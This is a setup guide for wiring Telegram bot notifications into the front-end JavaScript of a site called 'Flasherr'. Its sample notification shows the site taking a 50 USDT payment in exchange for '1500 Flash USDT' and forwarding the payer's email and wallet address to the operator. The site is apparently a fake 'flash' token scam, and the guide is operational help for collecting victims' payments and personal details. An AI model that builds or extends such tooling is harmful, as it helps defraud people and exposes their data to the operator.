# Telegram Bot Setup Guide

## Quick Setup (No Railway Needed!)

Your website now has Telegram notifications built-in! Just follow these steps:

## 1. Create Telegram Bot

1. **Open Telegram** and search for `@BotFather`
2. **Start a chat** with BotFather
3. **Send command**: `/newbot`
4. **Enter bot name**: `Flasherr Notifications Bot` (or any name you like)
5. **Enter bot username**: `flasherr_notifications_bot` (must end with `_bot`)
6. **Copy the bot token** - it looks like: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`

## 2. Get Your Chat ID

1. **Message your new bot** (search for the username you created)
2. **Send any message** to the bot (like "Hello")
3. **Open this URL** in your browser (replace `YOUR_BOT_TOKEN` with your actual token):
   ```
   https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
   ```
4. **Find your chat ID** in the response - it looks like: `123456789`

## 3. Update Your Website

1. **Open the file**: `user/js/telegram-notifications.js`
2. **Replace these lines**:
   ```javascript
   const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
   const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID_HERE';
   ```
3. **With your actual values**:
   ```javascript
   const TELEGRAM_BOT_TOKEN = '123456789:ABCdefGHIjklMNOpqrsTUVwxyz';
   const TELEGRAM_CHAT_ID = '123456789';
   ```

## 4. Optional: Email Notifications

If you want email notifications too, you can use EmailJS (free service):

1. **Go to**: [EmailJS.com](https://www.emailjs.com)
2. **Create account** and connect your email service
3. **Create email template** for transaction confirmations
4. **Update the script** with your EmailJS credentials:
   ```javascript
   const EMAILJS_SERVICE_ID = 'your_service_id';
   const EMAILJS_TEMPLATE_ID = 'your_template_id';
   const EMAILJS_PUBLIC_KEY = 'your_public_key';
   ```

## 5. Test It!

1. **Open any final page** (final/9.html, final/7.html, or final/6.html)
2. **Fill out the form** with test data
3. **Click Submit**
4. **Check your Telegram** - you should receive a notification!

## Example Telegram Notification:

```
🚨 NEW TRANSACTION SUBMITTED 🚨

📊 Transaction Details:
• Network: TRON (TRC20)
• Transaction ID: abc123...
• Amount: 50.00 USDT
• Flash USDT: 1500.00

👤 User Details:
• Email: user@example.com
• Wallet Address: TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE

⏰ Time: 12/20/2024, 3:45:30 PM

🔗 Transaction Hash: abc123...
```

## Troubleshooting:

- **No notification received?** Check that your bot token and chat ID are correct
- **Bot not responding?** Make sure you've messaged the bot first
- **Script errors?** Open browser console (F12) to see error messages

## Security Note:

Your bot token and chat ID are visible in the website code. This is fine for notifications, but don't use this bot for sensitive operations.

---

**That's it!** Your website now sends Telegram notifications directly without needing any server! 🎉
